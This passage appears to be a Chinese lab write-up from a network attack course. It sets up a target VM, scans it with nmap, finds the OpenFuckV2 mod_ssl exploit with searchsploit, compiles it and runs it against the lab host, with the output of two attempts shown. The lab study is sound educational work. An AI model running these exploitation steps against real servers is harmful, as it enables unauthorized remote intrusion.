+</span><span id="__span-0-35"><span class="k">if</span><span class="w"> </span>!<span class="w"> </span>grep<span class="w"> </span>-q<span class="w"> </span><span class="s1">'^nic1="hostonly"$'</span><span class="w"> </span><span class="o">&lt;&lt;&lt;</span><span class="s2">"</span><span class="nv">$info</span><span class="s2">"</span><span class="w"> </span><span class="o">||</span><span class="w"> </span>!<span class="w"> </span>grep<span class="w"> </span>-q<span class="w"> </span><span class="s1">'^hostonlyadapter1="vboxnet0"$'</span><span class="w"> </span><span class="o">&lt;&lt;&lt;</span><span class="s2">"</span><span class="nv">$info</span><span class="s2">"</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+</span><span id="__span-0-36"><span class="w">    </span><span class="k">if</span><span class="w"> </span>VBoxManage<span class="w"> </span>list<span class="w"> </span>runningvms<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-q<span class="w"> </span><span class="s2">"^\"</span><span class="si">${</span><span class="nv">name</span><span class="si">}</span><span class="s2">\" "</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+</span><span id="__span-0-37"><span class="w">        </span>VBoxManage<span class="w"> </span>controlvm<span class="w"> </span><span class="s2">"</span><span class="nv">$name</span><span class="s2">"</span><span class="w"> </span>poweroff<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="m">2</span>
+</span><span id="__span-0-38"><span class="w">    </span><span class="k">fi</span>
+</span><span id="__span-0-39"><span class="w">    </span>VBoxManage<span class="w"> </span>modifyvm<span class="w"> </span><span class="s2">"</span><span class="nv">$name</span><span class="s2">"</span><span class="w"> </span>--nic1<span class="w"> </span>hostonly<span class="w"> </span>--hostonlyadapter1<span class="w"> </span>vboxnet0<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="m">2</span>
+</span><span id="__span-0-40"><span class="k">fi</span>
+</span><span id="__span-0-41">
+</span><span id="__span-0-42"><span class="k">if</span><span class="w"> </span>!<span class="w"> </span>VBoxManage<span class="w"> </span>list<span class="w"> </span>runningvms<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-q<span class="w"> </span><span class="s2">"^\"</span><span class="si">${</span><span class="nv">name</span><span class="si">}</span><span class="s2">\" "</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+</span><span id="__span-0-43"><span class="w">    </span>VBoxManage<span class="w"> </span>startvm<span class="w"> </span><span class="s2">"</span><span class="nv">$name</span><span class="s2">"</span><span class="w"> </span>--type<span class="w"> </span>headless<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="m">2</span>
+</span><span id="__span-0-44"><span class="k">fi</span>
+</span><span id="__span-0-45">
+</span><span id="__span-0-46"><span class="nv">mac</span><span class="o">=</span><span class="k">$(</span>VBoxManage<span class="w"> </span>showvminfo<span class="w"> </span><span class="s2">"</span><span class="nv">$name</span><span class="s2">"</span><span class="w"> </span>--machinereadable<span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-n<span class="w"> </span><span class="s1">'s/^macaddress1="\([^"]*\)"/\1/p'</span><span class="k">)</span>
+</span><span id="__span-0-47"><span class="nv">ip</span><span class="o">=</span>
+</span><span id="__span-0-48"><span class="k">for</span><span class="w"> </span>_<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>seq<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="m">90</span><span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+</span><span id="__span-0-49"><span class="w">    </span><span class="nv">ip</span><span class="o">=</span><span class="k">$(</span>VBoxManage<span class="w"> </span>dhcpserver<span class="w"> </span>findlease<span class="w"> </span>--interface<span class="o">=</span>vboxnet0<span class="w"> </span>--mac-address<span class="o">=</span><span class="s2">"</span><span class="nv">$mac</span><span class="s2">"</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">'/^IP Address:/{print $3}'</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nb">true</span><span class="k">)</span>
+</span><span id="__span-0-50"><span class="w">    </span><span class="o">[[</span><span class="w"> </span>-n<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="si">${</span><span class="nv">ip</span><span class="p">##*.</span><span class="si">}</span><span class="w"> </span>-le<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="o">]]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="k">break</span>
+</span><span id="__span-0-51"><span class="w">    </span><span class="nv">ip</span><span class="o">=</span>
+</span><span id="__span-0-52"><span class="w">    </span>sleep<span class="w"> </span><span class="m">1</span>
+</span><span id="__span-0-53"><span class="k">done</span>
+</span><span id="__span-0-54">
+</span><span id="__span-0-55"><span class="k">if</span><span class="w"> </span><span class="o">[[</span><span class="w"> </span>-z<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span><span class="o">]]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+</span><span id="__span-0-56"><span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"no DHCP lease"</span><span class="w"> </span>&gt;<span class="p">&amp;</span><span class="m">2</span>
+</span><span id="__span-0-57"><span class="w">    </span><span class="nb">exit</span><span class="w"> </span><span class="m">1</span>
+</span><span id="__span-0-58"><span class="k">fi</span>
+</span><span id="__span-0-59"><span class="nb">echo</span><span class="w"> </span><span class="s2">"</span><span class="nv">$ip</span><span class="s2">"</span>
+</span></code></pre></div>
+</details>
+<details class="plain">
+<summary><code>stop.sh</code></summary>
+<div class="highlight"><pre><span></span><code><span id="__span-1-1"><span class="ch">#!/usr/bin/env bash</span>
+</span><span id="__span-1-2"><span class="nb">set</span><span class="w"> </span>-euo<span class="w"> </span>pipefail
+</span><span id="__span-1-3"><span class="nb">cd</span><span class="w"> </span><span class="s2">"</span><span class="k">$(</span>dirname<span class="w"> </span><span class="s2">"</span><span class="nv">$0</span><span class="s2">"</span><span class="k">)</span><span class="s2">"</span>
+</span><span id="__span-1-4">
+</span><span id="__span-1-5"><span class="k">if</span><span class="w"> </span><span class="o">[[</span><span class="w"> </span><span class="nv">$#</span><span class="w"> </span>-ne<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">||</span><span class="w"> </span>!<span class="w"> </span><span class="nv">$1</span><span class="w"> </span><span class="o">=</span>~<span class="w"> </span>^<span class="o">[</span>A-Za-z0-9_-<span class="o">]</span>+$<span class="w"> </span><span class="o">||</span><span class="w"> </span>!<span class="w"> </span>-f<span class="w"> </span><span class="nv">$1</span>.ova<span class="w"> </span><span class="o">]]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+</span><span id="__span-1-6"><span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"usage: </span><span class="k">$(</span>basename<span class="w"> </span><span class="s2">"</span><span class="nv">$0</span><span class="s2">"</span><span class="k">)</span><span class="s2"> &lt;target&gt;"</span><span class="w"> </span>&gt;<span class="p">&amp;</span><span class="m">2</span>
+</span><span id="__span-1-7"><span class="w">    </span><span class="nb">shopt</span><span class="w"> </span>-s<span class="w"> </span>nullglob
+</span><span id="__span-1-8"><span class="w">    </span><span class="k">for</span><span class="w"> </span>f<span class="w"> </span><span class="k">in</span><span class="w"> </span>*.ova<span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span><span class="nb">printf</span><span class="w"> </span><span class="s1">'  %s\n'</span><span class="w"> </span><span class="s2">"</span><span class="si">${</span><span class="nv">f</span><span class="p">%.ova</span><span class="si">}</span><span class="s2">"</span><span class="p">;</span><span class="w"> </span><span class="k">done</span><span class="w"> </span>&gt;<span class="p">&amp;</span><span class="m">2</span>
+</span><span id="__span-1-9"><span class="w">    </span><span class="nb">exit</span><span class="w"> </span><span class="m">1</span>
+</span><span id="__span-1-10"><span class="k">fi</span>
+</span><span id="__span-1-11"><span class="nv">name</span><span class="o">=</span><span class="nv">$1</span>
+</span><span id="__span-1-12">
+</span><span id="__span-1-13"><span class="k">if</span><span class="w"> </span>VBoxManage<span class="w"> </span>list<span class="w"> </span>runningvms<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-q<span class="w"> </span><span class="s2">"^\"</span><span class="si">${</span><span class="nv">name</span><span class="si">}</span><span class="s2">\" "</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+</span><span id="__span-1-14"><span class="w">    </span>VBoxManage<span class="w"> </span>controlvm<span class="w"> </span><span class="s2">"</span><span class="nv">$name</span><span class="s2">"</span><span class="w"> </span>poweroff
+</span><span id="__span-1-15"><span class="k">fi</span>
+</span></code></pre></div>
+</details>
+<p>靶机运行在 192.168.56.2。我们开始</p>
+<p>（本文部分参考了这个<a href="https://csnotes.bakaburger.com/study-notes/in-class/Network-attack-and-defense-in-action/lab02/">笔记</a>）</p>
+<h2 id="信息收集与分析">信息收集与分析<a class="headerlink" href="#信息收集与分析" title="Permanent link">¶</a></h2>
+<p>我们直接用 nmap 分析</p>
+<div class="highlight"><pre><span></span><code><span id="__span-2-1">PORT      STATE SERVICE     VERSION
+</span><span id="__span-2-2">22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
+</span><span id="__span-2-3">|_sshv1: Server supports SSHv1
+</span><span id="__span-2-4">
+</span><span id="__span-2-5">80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
+</span><span id="__span-2-6">|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+</span><span id="__span-2-7">| http-methods: 
+</span><span id="__span-2-8">|_  Potentially risky methods: TRACE
+</span><span id="__span-2-9">|_http-title: Test Page for the Apache Web Server on Red Hat Linux
+</span><span id="__span-2-10">
+</span><span id="__span-2-11">111/tcp   open  rpcbind     2 (RPC #100000)
+</span><span id="__span-2-12">| rpcinfo: 
+</span><span id="__span-2-13">|   program version    port/proto  service
+</span><span id="__span-2-14">|   100000  2            111/tcp   rpcbind
+</span><span id="__span-2-15">|   100000  2            111/udp   rpcbind
+</span><span id="__span-2-16">|   100024  1          32768/tcp   status
+</span><span id="__span-2-17">|_  100024  1          32768/udp   status
+</span><span id="__span-2-18">
+</span><span id="__span-2-19">139/tcp   open  netbios-ssn Samba smbd (workgroup: QMYGROUP)
+</span><span id="__span-2-20">
+</span><span id="__span-2-21">443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+</span><span id="__span-2-22">| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
+</span><span id="__span-2-23">| Not valid before: 2009-09-26T09:32:06
+</span><span id="__span-2-24">|_Not valid after:  2010-09-26T09:32:06
+</span><span id="__span-2-25">|_http-title: 400 Bad Request
+</span><span id="__span-2-26">|_ssl-date: 2026-10-26T20:25:43+00:00; +4h59m59s from scanner time.
+</span><span id="__span-2-27">| sslv2: 
+</span><span id="__span-2-28">|   SSLv2 supported
+</span><span id="__span-2-29">|   ciphers: 
+</span><span id="__span-2-30">|     SSL2_RC2_128_CBC_WITH_MD5
+</span><span id="__span-2-31">|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+</span><span id="__span-2-32">|     SSL2_DES_64_CBC_WITH_MD5
+</span><span id="__span-2-33">|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+</span><span id="__span-2-34">|     SSL2_RC4_128_EXPORT40_WITH_MD5
+</span><span id="__span-2-35">|     SSL2_RC4_64_WITH_MD5
+</span><span id="__span-2-36">|_    SSL2_RC4_128_WITH_MD5
+</span><span id="__span-2-37">|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+</span><span id="__span-2-38">
+</span><span id="__span-2-39">32768/tcp open  status      1 (RPC #100024)
+</span></code></pre></div>
+<p>我们一般不考虑在 ssh 和 rpc 方面工具。可以尝试一下通过 Apache 进行攻击，另外 Samba 没写版本但也可以试试。</p>
+<h2 id="通过-apache-进行攻击">通过 Apache 进行攻击<a class="headerlink" href="#通过-apache-进行攻击" title="Permanent link">¶</a></h2>
+<p>首先使用 <code>searchsploit</code> 寻找对应版本的漏洞</p>
+<div class="highlight"><pre><span></span><code><span id="__span-3-1">$<span class="w"> </span>searchsploit<span class="w"> </span>apache<span class="w"> </span><span class="m">1</span>.3.20
+</span><span id="__span-3-2">-------------------------------------------------<span class="w"> </span>---------------------------------
+</span><span id="__span-3-3"><span class="w"> </span>Exploit<span class="w"> </span>Title<span class="w">                                   </span><span class="p">|</span><span class="w">  </span>Path
+</span><span id="__span-3-4">-------------------------------------------------<span class="w"> </span>---------------------------------
+</span><span id="__span-3-5">Apache<span class="w"> </span><span class="m">1</span>.3.20<span class="w"> </span><span class="o">(</span>Win32<span class="o">)</span><span class="w"> </span>-<span class="w"> </span><span class="s1">'PHP.exe'</span><span class="w"> </span>Remote<span class="w"> </span>File<span class="w"> </span>Di<span class="w"> </span><span class="p">|</span><span class="w"> </span>windows/remote/21204.txt
+</span><span id="__span-3-6">Apache<span class="w"> </span>&lt;<span class="w"> </span><span class="m">1</span>.3.37/2.0.59/2.2.3<span class="w"> </span>mod_rewrite<span class="w"> </span>-<span class="w"> </span>Remot<span class="w"> </span><span class="p">|</span><span class="w"> </span>multiple/remote/2237.sh
+</span><span id="__span-3-7">Apache<span class="w"> </span><span class="m">1</span>.3.6/1.3.9/1.3.11/1.3.12/1.3.20<span class="w"> </span>-<span class="w"> </span>Root<span class="w"> </span>D<span class="w"> </span><span class="p">|</span><span class="w"> </span>windows/remote/19975.pl
+</span><span id="__span-3-8">Apache<span class="w"> </span><span class="m">1</span>.3.x<span class="w"> </span>&lt;<span class="w"> </span><span class="m">2</span>.0.48<span class="w"> </span>mod_userdir<span class="w"> </span>-<span class="w"> </span>Remote<span class="w"> </span>Users<span class="w"> </span><span class="p">|</span><span class="w"> </span>linux/remote/132.c
+</span><span id="__span-3-9">Apache<span class="w"> </span>&lt;<span class="w"> </span><span class="m">2</span>.0.64<span class="w"> </span>/<span class="w"> </span>&lt;<span class="w"> </span><span class="m">2</span>.2.21<span class="w"> </span>mod_setenvif<span class="w"> </span>-<span class="w"> </span>Intege<span class="w"> </span><span class="p">|</span><span class="w"> </span>linux/dos/41769.txt
+</span><span id="__span-3-10">Apache<span class="w"> </span>&lt;<span class="w"> </span><span class="m">2</span>.2.34<span class="w"> </span>/<span class="w"> </span>&lt;<span class="w"> </span><span class="m">2</span>.4.27<span class="w"> </span>-<span class="w"> </span>OPTIONS<span class="w"> </span>Memory<span class="w"> </span>Leak<span class="w"> </span><span class="p">|</span><span class="w"> </span>linux/webapps/42745.py
+</span><span id="__span-3-11">Apache<span class="w"> </span>CouchDB<span class="w"> </span>&lt;<span class="w"> </span><span class="m">2</span>.1.0<span class="w"> </span>-<span class="w"> </span>Remote<span class="w"> </span>Code<span class="w"> </span>Execution<span class="w">   </span><span class="p">|</span><span class="w"> </span>linux/webapps/44913.py
+</span><span id="__span-3-12">Apache<span class="w"> </span>CXF<span class="w"> </span>&lt;<span class="w"> </span><span class="m">2</span>.5.10/2.6.7/2.7.4<span class="w"> </span>-<span class="w"> </span>Denial<span class="w"> </span>of<span class="w"> </span>Serv<span class="w"> </span><span class="p">|</span><span class="w"> </span>multiple/dos/26710.txt
+</span><span id="__span-3-13">Apache<span class="w"> </span>mod_ssl<span class="w"> </span>&lt;<span class="w"> </span><span class="m">2</span>.8.7<span class="w"> </span>OpenSSL<span class="w"> </span>-<span class="w"> </span><span class="s1">'OpenFuck.c'</span><span class="w"> </span>Re<span class="w"> </span><span class="p">|</span><span class="w"> </span>unix/remote/21671.c
+</span><span id="__span-3-14">Apache<span class="w"> </span>mod_ssl<span class="w"> </span>&lt;<span class="w"> </span><span class="m">2</span>.8.7<span class="w"> </span>OpenSSL<span class="w"> </span>-<span class="w"> </span><span class="s1">'OpenFuckV2.c'</span><span class="w">  </span><span class="p">|</span><span class="w"> </span>unix/remote/47080.c
+</span><span id="__span-3-15">Apache<span class="w"> </span>mod_ssl<span class="w"> </span>&lt;<span class="w"> </span><span class="m">2</span>.8.7<span class="w"> </span>OpenSSL<span class="w"> </span>-<span class="w"> </span><span class="s1">'OpenFuckV2.c'</span><span class="w">  </span><span class="p">|</span><span class="w"> </span>unix/remote/764.c
+</span><span id="__span-3-16">Apache<span class="w"> </span>+<span class="w"> </span>PHP<span class="w"> </span>&lt;<span class="w"> </span><span class="m">5</span>.3.12<span class="w"> </span>/<span class="w"> </span>&lt;<span class="w"> </span><span class="m">5</span>.4.2<span class="w"> </span>-<span class="w"> </span>cgi-bin<span class="w"> </span>Remote<span class="w"> </span><span class="p">|</span><span class="w"> </span>php/remote/29290.c
+</span><span id="__span-3-17">Apache<span class="w"> </span>+<span class="w"> </span>PHP<span class="w"> </span>&lt;<span class="w"> </span><span class="m">5</span>.3.12<span class="w"> </span>/<span class="w"> </span>&lt;<span class="w"> </span><span class="m">5</span>.4.2<span class="w"> </span>-<span class="w"> </span>Remote<span class="w"> </span>Code<span class="w"> </span>Ex<span class="w"> </span><span class="p">|</span><span class="w"> </span>php/remote/29316.py
+</span><span id="__span-3-18">Apache<span class="w"> </span>Struts<span class="w"> </span>&lt;<span class="w"> </span><span class="m">1</span>.3.10<span class="w"> </span>/<span class="w"> </span>&lt;<span class="w"> </span><span class="m">2</span>.3.16.2<span class="w"> </span>-<span class="w"> </span>ClassLoade<span class="w"> </span><span class="p">|</span><span class="w"> </span>multiple/remote/41690.rb
+</span><span id="__span-3-19">Apache<span class="w"> </span>Struts<span class="w"> </span>&lt;<span class="w"> </span><span class="m">2</span>.2.0<span class="w"> </span>-<span class="w"> </span>Remote<span class="w"> </span>Command<span class="w"> </span>Execution<span class="w"> </span><span class="p">|</span><span class="w"> </span>multiple/remote/17691.rb
+</span><span id="__span-3-20">Apache<span class="w"> </span>Tika-server<span class="w"> </span>&lt;<span class="w"> </span><span class="m">1</span>.18<span class="w"> </span>-<span class="w"> </span>Command<span class="w"> </span>Injection<span class="w">    </span><span class="p">|</span><span class="w"> </span>windows/remote/46540.py
+</span><span id="__span-3-21">Apache<span class="w"> </span>Tomcat<span class="w"> </span>&lt;<span class="w"> </span><span class="m">5</span>.5.17<span class="w"> </span>-<span class="w"> </span>Remote<span class="w"> </span>Directory<span class="w"> </span>Listin<span class="w"> </span><span class="p">|</span><span class="w"> </span>multiple/remote/2061.txt
+</span><span id="__span-3-22">Apache<span class="w"> </span>Tomcat<span class="w"> </span>&lt;<span class="w"> </span><span class="m">6</span>.0.18<span class="w"> </span>-<span class="w"> </span><span class="s1">'utf8'</span><span class="w"> </span>Directory<span class="w"> </span>Traver<span class="w"> </span><span class="p">|</span><span class="w"> </span>multiple/remote/6229.txt
+</span><span id="__span-3-23">Apache<span class="w"> </span>Tomcat<span class="w"> </span>&lt;<span class="w"> </span><span class="m">6</span>.0.18<span class="w"> </span>-<span class="w"> </span><span class="s1">'utf8'</span><span class="w"> </span>Directory<span class="w"> </span>Traver<span class="w"> </span><span class="p">|</span><span class="w"> </span>unix/remote/14489.c
+</span><span id="__span-3-24">Apache<span class="w"> </span>Tomcat<span class="w"> </span>&lt;<span class="w"> </span><span class="m">9</span>.0.1<span class="w"> </span><span class="o">(</span>Beta<span class="o">)</span><span class="w"> </span>/<span class="w"> </span>&lt;<span class="w"> </span><span class="m">8</span>.5.23<span class="w"> </span>/<span class="w"> </span>&lt;<span class="w"> </span><span class="m">8</span>.0.<span class="w"> </span><span class="p">|</span><span class="w"> </span>jsp/webapps/42966.py
+</span><span id="__span-3-25">Apache<span class="w"> </span>Tomcat<span class="w"> </span>&lt;<span class="w"> </span><span class="m">9</span>.0.1<span class="w"> </span><span class="o">(</span>Beta<span class="o">)</span><span class="w"> </span>/<span class="w"> </span>&lt;<span class="w"> </span><span class="m">8</span>.5.23<span class="w"> </span>/<span class="w"> </span>&lt;<span class="w"> </span><span class="m">8</span>.0.<span class="w"> </span><span class="p">|</span><span class="w"> </span>windows/webapps/42953.txt
+</span><span id="__span-3-26">Apache<span class="w"> </span>Xerces-C<span class="w"> </span>XML<span class="w"> </span>Parser<span class="w"> </span>&lt;<span class="w"> </span><span class="m">3</span>.1.2<span class="w"> </span>-<span class="w"> </span>Denial<span class="w"> </span>of<span class="w"> </span>S<span class="w"> </span><span class="p">|</span><span class="w"> </span>linux/dos/36906.txt
+</span><span id="__span-3-27">Oracle<span class="w"> </span>Java<span class="w"> </span>JDK/JRE<span class="w"> </span>&lt;<span class="w"> </span><span class="m">1</span>.8.0.131<span class="w"> </span>/<span class="w"> </span>Apache<span class="w"> </span>Xerces<span class="w">  </span><span class="p">|</span><span class="w"> </span>php/dos/44057.md
+</span><span id="__span-3-28">Webfroot<span class="w"> </span>Shoutbox<span class="w"> </span>&lt;<span class="w"> </span><span class="m">2</span>.32<span class="w"> </span><span class="o">(</span>Apache<span class="o">)</span><span class="w"> </span>-<span class="w"> </span>Local<span class="w"> </span>File<span class="w"> </span>I<span class="w"> </span><span class="p">|</span><span class="w"> </span>linux/remote/34.pl
+</span><span id="__span-3-29">-------------------------------------------------<span class="w"> </span>---------------------------------
+</span><span id="__span-3-30">Shellcodes:<span class="w"> </span>No<span class="w"> </span>Results
+</span></code></pre></div>
+<p>可以注意到我们正好满足 <code>mod_ssl &lt; 2.8.7</code>，所以尝试使用这个</p>
+<p>这里包含 <code>remote</code> 字样的就是我们需要的，表示 Remote Code Execution。</p>
+<div class="highlight"><pre><span></span><code><span id="__span-4-1">$<span class="w"> </span>searchsploit<span class="w"> </span>-m<span class="w"> </span><span class="m">47080</span>
+</span><span id="__span-4-2"><span class="w">  </span>Exploit:<span class="w"> </span>Apache<span class="w"> </span>mod_ssl<span class="w"> </span>&lt;<span class="w"> </span><span class="m">2</span>.8.7<span class="w"> </span>OpenSSL<span class="w"> </span>-<span class="w"> </span><span class="s1">'OpenFuckV2.c'</span><span class="w"> </span>Remote<span class="w"> </span>Buffer<span class="w"> </span>Overflow<span class="w"> </span><span class="o">(</span><span class="m">2</span><span class="o">)</span>
+</span><span id="__span-4-3"><span class="w">      </span>URL:<span class="w"> </span>https://www.exploit-db.com/exploits/47080
+</span><span id="__span-4-4"><span class="w">     </span>Path:<span class="w"> </span>/usr/share/exploitdb/exploits/unix/remote/47080.c
+</span><span id="__span-4-5"><span class="w">    </span>Codes:<span class="w"> </span>CVE-2002-0082,<span class="w"> </span>OSVDB-857
+</span><span id="__span-4-6"><span class="w"> </span>Verified:<span class="w"> </span>False
+</span><span id="__span-4-7">File<span class="w"> </span>Type:<span class="w"> </span>C<span class="w"> </span>source,<span class="w"> </span>ASCII<span class="w"> </span>text
+</span><span id="__span-4-8">Copied<span class="w"> </span>to:<span class="w"> </span>/home/sprite/net-lab/lab3/assets/apache/47080.c
+</span><span id="__span-4-9">$<span class="w"> </span>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>libssl-dev<span class="w"> </span><span class="c1"># 装一下对应的库</span>
+</span><span id="__span-4-10">$<span class="w"> </span>gcc<span class="w"> </span><span class="m">47080</span>.c<span class="w"> </span>-lcrypto
+</span><span id="__span-4-11">$<span class="w"> </span>./a.out
+</span><span id="__span-4-12">
+</span><span id="__span-4-13">*******************************************************************
+</span><span id="__span-4-14">*<span class="w"> </span>OpenFuck<span class="w"> </span>v3.0.4-root<span class="w"> </span>priv8<span class="w"> </span>by<span class="w"> </span>SPABAM<span class="w"> </span>based<span class="w"> </span>on<span class="w"> </span>openssl-too-open<span class="w"> </span>*
+</span><span id="__span-4-15">*******************************************************************
+</span><span id="__span-4-16">*<span class="w"> </span>by<span class="w"> </span>SPABAM<span class="w">    </span>with<span class="w"> </span>code<span class="w"> </span>of<span class="w"> </span>Spabam<span class="w"> </span>-<span class="w"> </span>LSD-pl<span class="w"> </span>-<span class="w"> </span>SolarEclipse<span class="w"> </span>-<span class="w"> </span>CORE<span class="w"> </span>*
+</span><span id="__span-4-17">*<span class="w"> </span><span class="c1">#hackarena  irc.brasnet.org                                     *</span>
+</span><span id="__span-4-18">*<span class="w"> </span>TNX<span class="w"> </span>Xanthic<span class="w"> </span>USG<span class="w"> </span><span class="c1">#SilverLords #BloodBR #isotk #highsecure #uname *</span>
+</span><span id="__span-4-19">*<span class="w"> </span><span class="c1">#ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *</span>
+</span><span id="__span-4-20">*<span class="w"> </span><span class="c1">#pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *</span>
+</span><span id="__span-4-21">*******************************************************************
+</span><span id="__span-4-22">
+</span><span id="__span-4-23">:<span class="w"> </span>Usage:<span class="w"> </span>./a.out<span class="w"> </span>target<span class="w"> </span>box<span class="w"> </span><span class="o">[</span>port<span class="o">]</span><span class="w"> </span><span class="o">[</span>-c<span class="w"> </span>N<span class="o">]</span>
+</span><span id="__span-4-24">
+</span><span id="__span-4-25"><span class="w">  </span>target<span class="w"> </span>-<span class="w"> </span>supported<span class="w"> </span>box<span class="w"> </span>eg:<span class="w"> </span>0x00
+</span><span id="__span-4-26"><span class="w">  </span>box<span class="w"> </span>-<span class="w"> </span>hostname<span class="w"> </span>or<span class="w"> </span>IP<span class="w"> </span>address
+</span><span id="__span-4-27"><span class="w">  </span>port<span class="w"> </span>-<span class="w"> </span>port<span class="w"> </span><span class="k">for</span><span class="w"> </span>ssl<span class="w"> </span>connection
+</span><span id="__span-4-28"><span class="w">  </span>-c<span class="w"> </span>open<span class="w"> </span>N<span class="w"> </span>connections.<span class="w"> </span><span class="o">(</span>use<span class="w"> </span>range<span class="w"> </span><span class="m">40</span>-50<span class="w"> </span><span class="k">if</span><span class="w"> </span>u<span class="w"> </span>dont<span class="w"> </span>know<span class="o">)</span>
+</span></code></pre></div>
+<p>然后我们按照脚本的提示进行尝试</p>
+<div class="highlight"><pre><span></span><code><span id="__span-5-1">$<span class="w"> </span>./a.out<span class="w"> </span>0x6a<span class="w"> </span><span class="m">192</span>.168.56.2<span class="w"> </span>-c<span class="w"> </span><span class="m">40</span>
+</span><span id="__span-5-2">
+</span><span id="__span-5-3">*******************************************************************
+</span><span id="__span-5-4">*<span class="w"> </span>OpenFuck<span class="w"> </span>v3.0.4-root<span class="w"> </span>priv8<span class="w"> </span>by<span class="w"> </span>SPABAM<span class="w"> </span>based<span class="w"> </span>on<span class="w"> </span>openssl-too-open<span class="w"> </span>*
+</span><span id="__span-5-5">*******************************************************************
+</span><span id="__span-5-6">*<span class="w"> </span>by<span class="w"> </span>SPABAM<span class="w">    </span>with<span class="w"> </span>code<span class="w"> </span>of<span class="w"> </span>Spabam<span class="w"> </span>-<span class="w"> </span>LSD-pl<span class="w"> </span>-<span class="w"> </span>SolarEclipse<span class="w"> </span>-<span class="w"> </span>CORE<span class="w"> </span>*
+</span><span id="__span-5-7">*<span class="w"> </span><span class="c1">#hackarena  irc.brasnet.org                                     *</span>
+</span><span id="__span-5-8">*<span class="w"> </span>TNX<span class="w"> </span>Xanthic<span class="w"> </span>USG<span class="w"> </span><span class="c1">#SilverLords #BloodBR #isotk #highsecure #uname *</span>
+</span><span id="__span-5-9">*<span class="w"> </span><span class="c1">#ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *</span>
+</span><span id="__span-5-10">*<span class="w"> </span><span class="c1">#pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *</span>
+</span><span id="__span-5-11">*******************************************************************
+</span><span id="__span-5-12">
+</span><span id="__span-5-13">Connection...<span class="w"> </span><span class="m">40</span><span class="w"> </span>of<span class="w"> </span><span class="m">40</span>
+</span><span id="__span-5-14">Establishing<span class="w"> </span>SSL<span class="w"> </span>connection
+</span><span id="__span-5-15">cipher:<span class="w"> </span>0x4043808c<span class="w">   </span>ciphers:<span class="w"> </span>0x80f8050
+</span><span id="__span-5-16">Ready<span class="w"> </span>to<span class="w"> </span>send<span class="w"> </span>shellcode
+</span><span id="__span-5-17">Spawning<span class="w"> </span>shell...
+</span><span id="__span-5-18">Good<span class="w"> </span>Bye!
+</span></code></pre></div>
+<p>失败了。。换下一个</p>
+<div class="highlight"><pre><span></span><code><span id="__span-6-1">$<span class="w"> </span>./a.out<span class="w"> </span>0x6b<span class="w"> </span><span class="m">192</span>.168.56.2<span class="w"> </span>-c<span class="w"> </span><span class="m">40</span>
+</span><span id="__span-6-2">
+</span><span id="__span-6-3">*******************************************************************
+</span><span id="__span-6-4">*<span class="w"> </span>OpenFuck<span class="w"> </span>v3.0.4-root<span class="w"> </span>priv8<span class="w"> </span>by<span class="w"> </span>SPABAM<span class="w"> </span>based<span class="w"> </span>on<span class="w"> </span>openssl-too-open<span class="w"> </span>*
+</span><span id="__span-6-5">*******************************************************************
+</span><span id="__span-6-6">*<span class="w"> </span>by<span class="w"> </span>SPABAM<span class="w">    </span>with<span class="w"> </span>code<span class="w"> </span>of<span class="w"> </span>Spabam<span class="w"> </span>-<span class="w"> </span>LSD-pl<span class="w"> </span>-<span class="w"> </span>SolarEclipse<span class="w"> </span>-<span class="w"> </span>CORE<span class="w"> </span>*
+</span><span id="__span-6-7">*<span class="w"> </span><span class="c1">#hackarena  irc.brasnet.org                                     *</span>
+</span><span id="__span-6-8">*<span class="w"> </span>TNX<span class="w"> </span>Xanthic<span class="w"> </span>USG<span class="w"> </span><span class="c1">#SilverLords #BloodBR #isotk #highsecure #uname *</span>
+</span><span id="__span-6-9">*<span class="w"> </span><span class="c1">#ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *</span>
